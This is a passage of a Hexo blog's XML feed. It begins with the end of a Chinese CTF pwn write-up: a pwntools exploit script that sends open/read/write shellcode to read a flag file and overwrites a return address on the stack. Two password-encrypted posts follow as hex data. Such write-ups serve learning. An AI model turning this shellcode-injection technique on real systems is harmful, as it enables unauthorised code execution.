$1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    context(arch=<span class="string">"amd64"</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">    shellcode = <span class="string">''</span></span><br><span class="line">    shellcode += shellcraft.open(<span class="string">"./flag"</span>)</span><br><span class="line">    shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">    shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">    shellcode = asm(shellcode).ljust(<span class="number">0x78</span>, <span class="string">'a'</span>)</span><br><span class="line">    sl(shellcode)</span><br><span class="line">    addr = uu64(r()[<span class="number">-7</span>:]) &amp; <span class="number">0x7fffffffff00</span> + <span class="number">0xa</span></span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    sl(<span class="string">"a"</span>*<span class="number">0x18</span> + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/b9a2d7db/">https://noone-hub.github.io/posts/b9a2d7db/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>shellcode</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>ida小技巧</title>
    <url>/posts/520268f2/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7ce747a948ef85c49ced059e1ef0785c5d92a2c607911b81e4c7c50ef308373c">88297ae6ef5b1754b8d7392e09a2f26d86877fff9b510e30cfb7764df338a9bfc8fbe3eeed9def62979b145137f94bcb32de59dc63d31d66886a3a791277618c6ddf499447ec7eea876f45707920a555c62de7da86623922385a54b286d789af410924d206713c025d93917ae99a73ed2db753f425e925ee5c028c192edd7ba21252b55f511bf7d46fa2bf110ab9fee61debbad67365ecd57c4f408776e6fc536d924ee6ba1ed4cb6cb9a722c846645aa6477459600357e1457997a10fc459330a75b89910b5ab2a64fd217a0589f2aa1e6c1137b70dd700bc8b2517ee302a35830257b86ebb869c984ec859e2f1d53eeb9dbe4dc3ec0073a284f35bc7baf450dc3af760a6c0a10f619abbb9f9a1ac141c919aedddac201838ab8539d384878016d29031c653645f1184ed749011e795f12b84b2095a988e95e941c3a6f1b292ebecd867fa2f989bbd03f0baa2cc84c66d2337c5fa64c70ec9e16622980e46f40b6bbfbbe52309287593d1d4c53adef531b6e60d0cbbbcd29ad3e2721c9c2ad1831ce8c90867ce3f5b59293e30d31ac927873dc187a67c32fa2c0be6625586f7e737e1cf875cb396c25b6b3c1b09b70f8816a0e9cd6b6997c7e548cbe6d443cf98a5398a0f23205edc08bc97e4ad4eb9a20fb8033692cf64342ee2cf7a4010e63389298d7327252b4b8407e9aed41d0813399b69a384d83dc3420d3be1ec5c8eae6e4767c8ab7a366466c24f7274239723d1cc631f25e11716c7d421b20cd7bd37835f75b1900e45a28be0a4f2a6ab78657f10192246919bf69f17e23e02deca20dba360ed446fe2abeaa8ad8582492f</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>awd准备</title>
    <url>/posts/9cf53275/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="8f9ee876ee94647d9452d090e78b819dd516236ec54c3ab700b33d5552586621">88297ae6ef5b1754b8d7392e09a2f26d86877fff9b510e30cfb7764df338a9bfc8fbe3eeed9def62979b145137f94bcb32de59dc63d31d66886a3a791277618c6ddf499447ec7eea876f45707920a5556006b5e3788d8c5e2f09009bec8c6f5b4f615878219d8bad8ec4be0b06b1846fea6c1c38122b8252e45bf566d57990750f69262186c9bc2f5704a70a49fe5b3b83bd0bd621039ff4200f8c6f7995c57f557e38d0046e3f99e10db5d3f902e8575850924ea5d09f811d520b0b64d2047b8c63337c9dc8dd80ad460ad85a1215035026237303359cd722fccece1d1eccc7f2c0c8b2f0361fb8f46910e3c7ea809f1420e56514d5430dd7e6407bf3347bfa604cb397d1f932a53865c623e597dfc1f050f4bd14912647cd6481b14f7463f8df2124cc7d7c22051a4804fe11120b76d24215d039ffb805d65ad101e8aa4ada8b3da2f369ccfbb206b124670d9a7700161ec449b092c1702eb4f8d6205767691a16aee572f517985395caa0979aa25bc989b456fac5634f735f82d64c85e396a138f6f96cc5148ae9f5de71a4b35d1bbd759d5ba7e7996843d0c857ffc83a3e38a53b9c1ccb1f6d34164f4f410eef20d3b5176fef18ede7e53028335c595dc7dffa4f61d6a385f48a85a8e03aa4d431ee103134096febb7102fe758fe08aaf4c6d76b328dc355326e937a3dd4ff7b0c98aed8b62a64b50b1cec8a642188f5192c6c5db2543e381fb2fd2154ee9658ec2fda8cc6370126af7c50c520776d811c0af02724ef60c48dceb84741a977a03cd3b2cf0e2441208004525204242eb5bb907ce2c79a15a728de0a5a9766bccbe66da52aba0a504d4f3cf2331c66e0b5634b4263335ccd4ceb4e698ebb3d2e35ea57c54beec2405fe4557224558f3b51be730843d0d847511c6b09b737376159d08cac096d352412419ab1251516123a6691e8db386e1a70c47b2f9e8f0c3ee4597835782646ed96b52c3472496117ea6f0a92d6b77759f37deeeaf18811502f107fd0b093ff313b84ea8930dceb84aab881506764f5f323a2eb9786833824b3c5d31e68053b83318e013f65394240506388eb8a1dee4139733b273022ef06bb0ae1e8b9710085667416c67e240a05874149950a6509dd178ff5adb26795add6e047e161839453bbea33cd423495616178f3398939c2b5234b672f5fde8a2f5f03854842af84e1cc0be5911f85bca895c1bc4026b43425effb3b33c4cb615369994e41b1fc198cd331fc664389aef9164ab85f9719f0c3848d74021663e3302b16fac0cf82749601c9a61520d7f041534342009861685aa9b37435f4751bddcba75ddd0ea857bfeb909f09a316e0e81da8248ac5d49ec330d26bb52114d1368ade3f431416d4230e37159954d758708ce6f03cb60b86b8f243acd2dd732e84530c651560c9b14992bfda634a35798757d9fbf6dadb429214837351a84d1e11b1e8d3ebe0d8d2293d6136e40f97d0c0de025bd908c08a678bb97ff027332160f8dadbe7acac0e6c28514596b15e4ff6fe57dedc8f3fa1ad00805f78798a53478db9202bab71d1977160bd6fbc5b98ecc8d8f918305136a63f7aab16c5385624ad4c66414a5c57324dc057081fd5a14c096d5920b247810961b603bfd4e855442481b5ba9c8fc7b0038e17c451e36947bc63c77faf339811aef6836922746de2d7b5216bc54e9d2720cfa694558abaaafc5b06bd098161a617f4a15a05af79c010709a49552eb0219d3fa0373366872b2d439eb6713563fcbdbf738ec55effb67f2402f3b863adf8ac79a5fd252f0c400d04c45955e37bad9cf9ee7937f6d1e060c967296f39d065e970d313aa01521afeafdbe84a858b13c959cb882782d8158b5acac1c67a50fb550edfa3fe03f8b685d7a3540ab8cdcb1c40dc883c7ed711a0a7408a385c54ff36bb0727510183afe95bafc36ce58c160cf616ed3307935614ebf943662218f8a146279ca6884d43ca55bc515dd87c288d30fd3479f94bae5dc379bf340f4060951450c11e9b661a30b929ad0651c1aad23a31e2b319b59de86eaf2099365828dd3a2496b48f757769b78d296d2cb2bc83a2bf247ea948cd14d40c1cfcfd5cd234f825cd0790cb0cbc8e6d3a1725500cf0dcb5d79b253fa3aca43b4b2d0cd4d83441d771ffd70dabd866ad79b6d639b671e4e42dbd716bf815a058fd2adb57e515ff23e1b1b8218841dba867c24f2ce47a3e4cdd77803c81693367472a01e14e280e92966dc1c4e30f85c185df986480936f275ae3a561273062b52bf122461f27f97d82f12793656796f1d77988615035f829bdc120beb477532fe184ea1012dcb68324257f597772a8f69fab17d3f934b6bc8911f2b1b49fb948127197c4263f65b1e8785b8c10869939b2857d9725314d3f2d5974844aef2fd10eb186ccb4f5440026bb30c19b38b3e79153176994ab426d74dd9c9a29c516dfa02ecc488d22a6ee3acfe09859fa4d81bb0de1d1d48854bedeeb599131437adf5628cfb7165fb199cb1371f5298e49ada7c2f63a81e9b1522005d757241f6134e6620d6b1e8b7842205a28312142039fcaadbb824d6f56bb9c1a2f68be5dfeb39e4cda4c8b9c8692f3c714b91569f71bab8ebad95dfd1fa851ebc79242dac4dd360ff5ca3f7bcf236936f6146d6489f32ba85fb6b70c6f30f6b26bbdb46d1d5d616baba4a4ad4b109b92dff59ee45e8752dd5dd8facbac868633dd253675757c74f04704b9f14fe5d0c9e3c71bc6c8f488d5121ece3ed5374e6c980a2162657e3f1cd7a2bcd0be52e78325f9f2d2fbe4035bb2b13f42da27b052f57a2f4100c7c5dd240d2601a91e94338529f6f225cee0b28e54818a93d17c06a5fb5e42340aa8808d3ef84e3358a8ebad70e9bd9b23d7ac2df824363d50fb9772cb284b6178118baa0e35d3005864782be560a97a03ed8d3abbe6c56eecb9016d2d3242fbb67a6bfbaf22ca97be6a62310bbb9e2e3329b8a6eb1ac2b0495e10e277781ec3d059e0eddaf3d9f6c22f169a724a3d57f1379e4bb0d8da1102a02796ddd1b6b6bff57cabc25c1d4523abf34a7b41b87eff75dcc628c2d714edefb03c07a30ed2120de2e5da65832dac92c7206628764319c1caf36f915edf3b5bd4ef5550e74a7b7b99c72c5209ceb961b5f1c3b91c47c1b62cffecab4d52fe62aa63e1b654a29ebba5c7201fc32beb4b1ce821c014a7843169ba6e7ff0497d3f1b4f11e500ef4a63d1c40e123b134f63b346542f92aa9501c5ba82903200411fc1b8223f88f8451c15bd59a51f478ae6ecc4e7d844fdaa9b9dded2b9272863669d0cea9ab34c83ded0c90386cf7f88630100b9e6188b13a0cba67ca45616572f44b2dc57e561cb83adaeff442f2e140f9138fb14b6b0cffb3d341db13637e84e13e60b93ea9155c65f07f40c2f2973e5621549382af84e81fb93ac6eee5221ef8cc1cce36fd6902dfde5d36521aa71145d3796c3c5442623f51eb975798d086caac4cb43c07e065beb4a19be10188094a9ad26f98a4dc401c92111ae5afd6eca5e34f40c8c0fa7cd37e8a6b929edb3595b4ab809728208cea83b35479b3dc6952cfee31821feab1f9bd50afa0999c3abf51f6c447a10cbe474cca26d42ca156253521d88daf6d234e70794f3e1608c54a695f0954716d56bbf09c5b6d6a02fae3525eb0613bea71b70ceb10cecbd3db0a01febcb2c18e88734ce632e13dab870374c2bc5dd3b7cc7485c9f0c8f1c1091519f2e90cdf9f83f991a720041f246d985f95a3930da6a0f5c753202358eb218ab9856725bef577e2c81b868b4da448f93e91152d487fbdeb4da8b7a2d57a09a6d493aaeeae5f491dfa05a350acf1945a4d64376da9eff058ed46fea6fea1669651a72669f11154fcb892ca97e2f46f2c3e00bd432564a7acafcea2ef420f8ceb15fce09ca6fa2a94ad7ffb784bfd46bcbe5d9be231569219b30982eba224fff3dccd2bee0cb5350966a508da301b6863be2ac04f981e6b69f78cefdb5bccbf1810f318befcc752eb5a7c6ce50b6643a6ba70b637c332e242dda3cd856a2633d509329c8a3bae5ae8ea0005fd144109089232c7072ce62b86c21f49bb6cccfece60e66fef0f067044dda0dc5c507233dfbe4fd90c58409351cbbfdc6061be49f31783db821c94cc2b63c9cd2e4da5eb7ea434f3102652dad0bb612d59e7a0c68f00a58e5b2d85b0bd94a32fb7e8e71c7b9c25b51487c90b27b377b0cf92e5b40a1233343c36b27b33d64e9334dbceb5d06b4a78f65a01254641e6b2dd4a4c39c594e85c493e420c09ab8afd2779cc61d03e2c72a52898a8e01465e52b09cd2930a5e7e925f16d307c7e4baab1a64618413084778d2ed94d33cb8bdcc80deb561dbbcd54e97215892843fa1105cab0f05c680b5770901336592df56819bab64add40b8b822c561c2b51e4de2f450e80fbef6f148bf5dbbbd9517dab9980c618fabbfae3ba8043d58f8a39d2e4970a7af5b2b32735d6369248930ec99a0597ccdc6d8addff837773773321e4b24127dec18daca69ab7f5f03302b8039446ceea38fa827eb690e9690678c969ed7f7ce10483de69d6d539901366ae7215de8ed753ce5faafc96ea034b6f93552a702f18f2596d42877dffaf14a6e2513ba4ecbfcc397d62f026596f80302b7fbf3fa5f530747ed872f66cd80fb455bda548e36b5a7336cae79d9feb9e132fbb1f0974ed56b1b46e02f554f54ce09916782f2438db4a2816dfb65346df1efb638d4b50ade11752315dd99e0d9926908eb0edf5a767ac4266fea1f905570694af836ec8a6dc0222a44e387ac37b2e4682a013d585d03a0885a8b26af6d55246146f7f05310b94e103cf336813139f396a9db454cc2aaa483f3c114ae16d1c6e3f96f1fbd9eb004c7bbcb93f53102eb983fb9eeb5fb4065d4427feb62e3eab9b1dd3862a37f99a2772445e67e6410813c4818fab05ce79daa9ead17595d8d7a9834d291dd729ec86167f7a970d25ea59944228a3111176aa7af102398bec5cce4db355dcda3c4d4fd0c68bf70b83bd29ee6f469c620c0ba1eb1fb87bbe45803668dcd80d551b49ac9d055969c38bdb7212b6696ba3f0878edb2bc038630087059bfa86e724b761ad15c2222fe8d1583efe5ef2f1e27741ed705b6baaa28c88a3cae51d6235959aeec7ffcac54a8b88041f2a67d3f984f8175dbdc9b37000dd99e15f3be9b12622ebd3956724f128f3ddb76cc246d3c597aa134104247b5776d9c310a4e2dd3654613366e0e199ade2000ca4b953b3f3e9039265b7ca1bd696a55bc4c0453f4a9dda4f3138550c9fe147003e240e8fbdcc09ec0eaafe144770bc98e8cfef755ab148706db61b8a4fe5336a1902b9886a8456c3b4f4fbadc750669ef8bf82ba051952c160456116746b7ffa08efb61ef269e7e6e9557ecf6914abd1169ff26ba6bbaabfe4b94c13445aab4082b677aa481036882a729ba9f829221b7dfea4e7ed1635aefd8371acc33be11d56969b40168aee636b94383e395084656351af934e15ec36af3d6917dd8c49ce82359016f2e06517399ead8e076b03ca7cef3ceb85cb45fc6e46c24d61cc9c09366954b8d44109ff90eef2dbfcfae23b5a9dde2abcfb5d8af4e7ebdd68306bb1ea9d9a8eacb25c7b79db8e5de4e3b3c90b27b433f8ec1cb67b398b67699c915a9ecdf4e5a9fbafbf11c5e5340439259d65d79b4fc9ce8b726002a1b480e8b03ef0af7c377036178dfc4a9cf3025ad59d30e25f1bb916fdd37d8ccdeb03d75513392a8ad945cf922970e13166d45fdc37f9849a01998eb701e147c7235c01449d32a5653c19707d75f1f80975413decd65a67e45ccdd4292fb630196f2d9357e27854e3bce5e8452a2b58307727f92e8e054c0d9f60dd9299796738898f4a982190abb972e53bd16f8b6bf96cb0ef01ed42844970b1c9687592056b69e34de6b3123bfbd7708c971441c4ebfca7467c104149b432b986feca920228b5751cce1acf5e9d1988f2bf4fb72bbc7493b16788d88cf5c30b1da0f73407f58509237f07fabced382fe6f42fe7f91f9ed0ceb9d5657e76025e8a064e8ec3da1fbdf75c6b0c02c4c84905347d2c8fa7900ba835bf269dcdffe7daff7c8ee5481f508e1e3a5a4c13c0aeadcde3313c5aeb98b358a2e789ab0b3738702e3b35f4e9523117fa032be2b2f6c30bc56d31777c28aee892eeb2cabe71a596586d1b31b13d9210adcd5aa2471cfdf5e197e800f82075127d75794c05e69843971e04abfcaa5461fbb094104f07af81dc79d2d6b3d0defb51511787435cbb5cc6d6c5a9269c1ce20877bb1b013f4d231d52adab008291c1e220e34c02f692e60d1213f8dd17ba8b851c8ba79aa72d4e3fbcb86721628e2506da0adfa4803ab2d541cdbcaa8effa2170065192364fdfc2815387a0fecadc8232ef26dfd6c1f73d0e96ffe6bf07ce31990368f7e19c9259dc59122a11288933545fa57d6d965fc26e6487ca512c1330bae7e7e0e494dd4e4a1b6a0bfa3c1c5e97fb1d71dd7e9dafe6e464a8f6160557690f3294d77764f9e969c2bab6aa428dba69c66314a7ecd2cd4907a1cc8657568b99033caa5654c8237f48c61b0efadd7ac22fa664d42377894068da2c46c5590ac5c73f34d45b2e7df15a2c70678d10f61c4abc232c60633e5351da25e1c3592cd9b91c0b5ff886091baedc5da0be0cf0eb0ed50442ac5f6319eae5df6f3c63b8ca3606e0883c6afb6bbf4a557aed8742ba8dfeca59850c6ae1adf232e749812f1f82b3dbf0e0867cee01edcaa5e7d22fc0c0c63f914e4c91a890a282b3fe1804c2ad70acd3cfec798b36586dbbbe238e4df24cd0a95ee742a425864dadcc5f38b356227aa712ef1a7963d97df74d92695bae04b485073d93e8ec60e2cbaf792ebd0395ea84aa02e1322699c333855275d0b311fe1f9ca7c9775494c4e19e78f6ff04f4459f6c3aba648d839b763297b6e56e337e93414fec95560216af5d3dd05aa3eee599f0209f8dbe673c01665a62b9035d786f0d7691c244c9f9ccebb7a288e4d52e25a7675368f327f9490c7daff3a5dd382bf7f0cf684014446bd8b6c01f6d48cc8528f5f7453e87e8e0e470567f772cec39cf5937e2aa1743f610188ba312250bd853c015c98bba26eb6581c25c8156cd6cc459f095639a0d853ea48f642cd0ff5ac09a27d6af5b24fe7a4d6948c014fd002975aad33c95a53f792b3e9c0ed43f013546ffd8ba3921e6f6c4b5d17c92f7d8edae25192399392c3674dcd1207261e82d38cf73d620aeaccaf7f3805562a85ca57d92b7f5587009a73555be439475dc10dac662f1f3756bec939152830a86223a17546d16f1cf97c86d0a55b79ac113c1c3b6d2287af39f4e6d6f35d9053260cbbba5f71e16ed8725047a55678ac3bf24bbc909cb9ee5257bac2e3121caf24810ebc1ee2d595c01f5e3b46e57e78fb477656081ba21660c3b5a8adf5825346b024fbe05e7e4b7f1a269ab87f449d0fe1911ddae8a3c14e27582807a1ec4708bb5fec1b58e0f6983b256790f565dfd22967a6371e4d5ff0c6ad0d667d7dab9f90cce4847bdbbc7da4ef2487e732d428f3301fbe1190bd66a5a1cec038aaa32771e0035ba1f83f734492e383deda336a6a3e7a0879ebc2aca871e26800e825bf583f11dfda54e5b68589e0568aa618fa6486559ec5f3f5f436c2a7916756b0dbcfcacc25db45533b61e2f557b96acdabc2056a8b3f1993a58c8227727868bc6f156ff7756550dcc96f5a4057d2b011eb9083c009c30d2532932e9761dfed3690f242724515bdb53700810d4ef612e80e9142f1a880a4f0c53df5dbc76a142782861d8199e56d8c50efb2a82a24601efcca7815d40edd3cffbd93b212b4ccf579221686c49677c21b283ac6c1d93b3d106de6d09a5688958d7e00e5a9a33d09f760e6b82749e5408d32bf4ff34e835939ce980a4960f232d13d44322ca3f1a554d5fcb1891c8f29acfde1b762de096e659e138eecd1c116263ec21457044042c03a0b7ea017594add21ee91bd7499311321df849596a4e31e079cd1586369276a423dfeb8105b2401b4562758f3d954b1cbdf8c60e2d4aa23478fbf8e199c98d7e170818efaa000052faaf5a6f2199feba3811110dcca23b02415b361cf144885d8e4babcc0fd801d4f59b5440464541452a24897f29eece3652681266307bd367df6d858eafa5dd1c2485456320c94b6beca5aa67392b433a2c76c9fac335b471af63e3551a2605a63b7a7b9a56eb22436ed86beefbeb6bddaca6151a4b2617dd82fdc595a841b3f1db7db380f789712832985fc02d7855a81f90a164d7cf58402366d281aabce01a491c1cd91a1df4be8813ac7fad58b858fee04a2ec5327020e4bdee9c3eeb244c77668565e18ca073d2193b9a850f3cdf9549c93467e13d4094e665108b2891cb6d9be252b139d5d716640d16fb916bcfdea07f384f09bd2a124e8199d9349b461e9997edc9120d751bb83ff21660481ffd26dddb8d4b17bd94f9347e15f86f8ac64b8fe93df172f095c015242a4bbc1a223e8f5715b3fa38b9608f554686b3f397d81e557c379353cf8138c2f51a666dbb79c8897740b8de62a9dfe68fc5d6effab9728f83a1ade2a6084aa8e35bdbae2b141ea5de59c338ae16e8a7121e0376439c7baa9fa1e756609b05abe7500aae42e0a66adc9d9914436636cdcee8e056cb346a2c9620be34ab33bb801a81ba63cc6e58bc593ba272a84da9ffa36ca80e5fc1b6e22a83ca0736d3f103a4006ac1d0e36fbb0e105f8d67506a24b13f2da0c435ce9f43fef0738c122ad822d8cdbb8966f8d19c90c9c551d12d3097e51dde2729ed002fefb2b68be572f4a7cb5128c7d76fb0c63975df6d3620a5bc2a6faf637537ceb3b890d63c35cdaef759aad3c8c6cd3e02aa524830fa697baa7cec076cea040c5722285ebf922707552ee2bf46749630564bdf9d1ae57f40dcb241f32156796dd41cbf61264ae582cc12af6491cd9565ab4543908049436129f31ea0271099c4289417c1d787b37749ee510ec9886f9f97a1f98a02da15d41fb837b8fa74e9f35087b0b48e12e62b791d09ac1ab391d5f24260da15de743ee0a4aa84c5579c597525c5520742abfe0c43d3b4fe7d331beef239d9f5e1432cf927c8932f78e616ab18e2c458c6e7fdeafd31b7991d0a73ac614456433c404d88838cdb4abbec7fb9d4bca748adc9374d08149a59bdbca368e67480521753b9a256f130938fdc71cff1f1602f65ff37eed800652840645191c4b739d62aed57f8f4de07807feec89213c5b3589b918b78e7d562bd4a2ab850f97810ff3ab2f6409dde5183092c2567798c13b1ed1c2008ebee020273d8c86f668bcc77ca39242e7a1452969707cf0f02bae567bf64c04d56a0d44df3d19c8f430abbc693aaaf11d39aa8bd07d3df61fd9b2ba61c4a444c74cd5bab4c61ede3ef01df0ef369523a5f45dc9033663da8e24e9cba8ba731a34a238bdf794c77a26eff3a4645e0abf12dc821c1f67c70cdcbd8a109ce1c04eff9f59939c3fd6ab22da431bccdf1a4fb388888eddca73e703b7fbec209c51bfd0587b422711864cd25c83a80cc97da8c7fdf2d49c94c9fbf0f5b8a61390cbd4b5f5c2c0d39b0ffb3bb43c13cce23d7dfa23a9ee0521e8e81bc1568a82ec9c4d716f16a959169b5f90f46cc2c0316d64ba2e3d4096c8cb4021172dc8b636c949a7d450e4b50fb473b83cbf87072b6ca7e8615d9a305ff62b8cdd92fc015035fe7470d6dd45e3632df428abbc22963f8bad64bc8f69e533eef7c05eb62c51c4982613ce52ec7ac96732c9426a783eabfb31c267fef2b6d155246f72d0abff36ee4d50abf57be48fe48979e01dbe7834cf4aadb3b33f4e43788a9601745b583c950f765a802c5c7117bd39dfb2fef4efc0244c6efa454d39678cb0016ef064599ca9c30b981ecff0a6a4f1a1d3da2bc94f374052d4ec9ccbec6964197a38047ce17961e72cbf5826c5ea31bc15be74a3336b8ea30cd6602c5b99282568632b6ff24709f8a48f48060dd795c2ff1c655fda4109206396bae38452295ecbae9915a12f63194b9906ad074d3710085aa65a6542b0759ec3dd12ea708b68dd95007b850ea33c389d126f5768d975392b3db60516c002c0d4791274579cf24a91bdc50e7d2c19be97e5ee05f0bd8785da682c590e905873845d743c1c6028cc1d477f7b9d01241117e4af95c51d6d8409c3016a083cb02a2b7b1b7c5aa06d205060a01eddea30e713fdbc3c5b8fafe1d7625814f1d861ea772e43726767cae0d42df6eb5700c1659b26bb3128ac718b17eb8cbe91542514345daba97810b533537194c9ab22df70c372280abb688d174603d0af8e22dda6a3dee45cfc133f848279d145e0e00adc45a9f5abc7d9f0ba596c24b6ce4cf5974de6b4bea3025b7341be70d7d397e3ece6b4e5e2883ddfb53a49c0025f09e0c9a7f789334e39d18c93ef4f5276603b77a95bea5f927a62793381c38ce73d1d6d59d161b5340a2cbae8c0bce320ff7722f2e73a33ace1ebdaaf9c0a3cbffa179a4a22d0fc1cb174f70221425e04a20d793ec91b6582bdfa012eb3d6ba3978541fa427d948df9c35ae6c6f1d651324681cb88f5d322f4ca5ae1c83a8a31a9d73df940d948a6cd14bbdb3ea22f92f9e9cd1d1306eabe2590c45f5d427095137752b4f4ac8493f498871daef96091366e835116233f3059c2588a72fba7915dbf0ef595db64bb240ee82d6dd468cd136ad9cfebd610a7282970d56a64be14f4ea8f4545ad5c4b7aa8431017cf42d9270ef71f61c53b0d0889b4fd61901c998558ab7fd77487f0420069ea4fb8890bd0cd5a07676df05af1ea423790c556eab57296518982394cfb5db50a28e09049cec1f4c0807d1e3eedd70c98f2d474897edc7bba9b0ebac89b3b9671b21c8aea4f24f99b70a50bbb7e164c7ab28c8bbce11ced921d3e16e3429db88e83451ebde484c01662942eacfc08b130ccc76c7c27699281a60fad55a62e8876432361ab19387a15e4156e570865c3d3c78be820e3679313d864d511305a6efe6b08d5f0299696b893d3c902df200c6a8992b391692c3b4f6c9b4e4be15bdae229845147a87608179545310d3ceef29437221058e34edb1111b5ee8bc5ea6f0c50758b7aca5fe02f4b4c7e2f013e54383049ef2390abcae247bfc5e1ddc71108b3c0a4aca1dd544545882d0546f18557d3e889158c2c853a1a4ffb85185eea3d2b72bc69757dc0124ae0db5d6d1e29482d0d30799b8ee7b62861b152ed304a0c417395d6129e6f5944d8e9029cab6a448caac9524f7bb826547f33aeff320934f35c80569ed2ba64595eb530be4c5ecf7e3acc074c4af52ce0fa97bd142c0fa60f9deabb28b0de423fb2884dfbaa1343a219a385dc3f0330ec1e269cd9712492249afb3b3af9838403848279c9ccb08b47a6c0e6abd4c32983c323bed78f0745d9b910357ba9699e4e6a451916c503114558f6abdcb0a456a7b84d146c03f880e30c999d093857eab050f5ca110a36613631f84fe6a1b2fa86bca83c7260243283d32836c6998c61c9897043367e064467af90c441f5a4a6397281cf6fcae066d7073baf647b73cedd5d00a61da4c023b9b4cdd69c14c4ce2bb3026351863a2f49ee066e7e6fb436b89eceab5fe2d2eb6d1411284bfd5e37e44f790e8dcea3e5782ca2d6c838a82c88c55b2de5c32cbd54ef1bf93fd548ca563828c9ba945bae2a4479d38793bf5207df0ddd5ecaac0cecbb4a70602cdc55ad61ce5a843b7f79d01a0b28f396475bf49a970a4ff933f698f4300c9d44c12607888d39a6b351bc67ed60be03ca42a592b0623df7708e4771e6164412de8b634f0c25b6ccddea491b6220b96d96759987ef4e30aa8fd25ad6b84d8bcd1c77f1664374e5fa7659a03ade23f2d06cc053a7eb78d7c8c58d2a369c20b8a431f007c77af4b58c25489f134c0ee32a040e28d1139c715a448098e20a59d438efdf73d051ed0bcbc3eb6865208d0cda9c3bc04b7dca588d5d5a157d2d55dd96f7ebfc0599b5e34b239594a8212b5fa312d1d60f385e986090c61926e311380735624bc4b248145abd3b1c2da1c64dfa4ead61d55369eac26d343a6827a73de9314699016f25b48871a90488d5ddcb6afbc70406f438498bbf54b4fea29018f5b40f8b02469faf031fe85df5db852574fe5d6f78c25047017d4203bc1da3f3b12e4a2175c5ec2f56b3e43bbf5b8c3f9107dc521cac12044409c864fec520f5bd8ca77f5a6cfa4c732733b4fcf8742488fa248cfd3c51592315173b5c587a93728b2b8371508b2bd18bcda3b951996109ede828ae4c37cb6769c1c3698fbf6b4cab8e1724f1e61d236418908cfc0ca440eb3928910f2d92641d71a3936a0a806a69c8fffaf3bc231bc7a520697d76736960e3b46e46efbbf080ede34c9f47fef7a2ad79130cb5941184a8cbaf37138a41144424a22e519834f25a0cd8a986e60d541b7fc736de291bf253146b481793507da92c5260a076eacb311b0f86823a0a6c146300690a2ceca5a3cb3efb9cc1a70e433d2f6a69b6bac78240b47b5d0ac2d2b00e571daae5fdd64fb3c308079fd69e2b2334497ef4c0a6dade5e68c87fe744facfcc0cc521ef221813f9d6fa3473ce9db050b3c86198d601560e7b98e0f25689768b5d84210f8dbb492dfff11f96b0f3686c4b427802db0ea05a05c5c265bc918816210721fd03ea0867af16773f002c27f67f061c99919fdb47a05892832052947bbf798942d7603abf21d1c9899b4d48baf9d0069dd2cb67777fb8fddf859aefe30d002acbb450fd233cc1a595eb5eb916d5de347eaf512ef8a72aa331c662c53d301aaf6876cfb4348a10e8b5881c92a8f3f2971ebace991f269385ed906b06dcf83338e8f6f751d3c53b24240a700646c676ca5a9beaa3553bc5fe7f6dfccebab2e53ff38201ce90dde19941abba8d050f2c202aa6794d7baee5f6e6baac1924140223ebe713f2b94d5aec5bd5f249f3c1a1ec5ba3af5101d3ddb8795cc42423478bab98ed3d5875245b35e4371ce6aa82f2b9b051ac08e6c452f92b8